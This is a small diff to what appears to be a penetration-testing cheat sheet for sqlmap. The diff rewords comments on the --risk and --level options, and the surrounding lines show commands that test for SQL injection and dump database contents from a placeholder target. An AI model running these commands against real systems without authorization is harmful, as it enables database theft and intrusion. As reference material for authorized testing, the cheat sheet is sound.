@@ -430,10 +430,10 @@ sqlmap -r req.txt --batch --dump --mobile
 # Specifying a PUT request
 sqlmap -u www.target.com --data='id=1' --method PUT
 
-# Force sqlmap to use `OR` payloads with `--risk=3`
+# Force sqlmap to use `OR` payloads with `--risk=3`. Helps determine the prefix to use.
 sqlmap -r req.txt --batch --dump --risk=3
 
-# Force sqlmap to test more boundaries `--level=5`. Helps determine the prefix to use.
+# Force sqlmap to test more boundaries `--level=5`. Also helps determine the prefix to use.
 sqlmap -r req.txt --level=5 -v 3
 sqlmap -r req.txt --level=5 --string="Welcome" -v 3 # Check webpage for successful string!
 
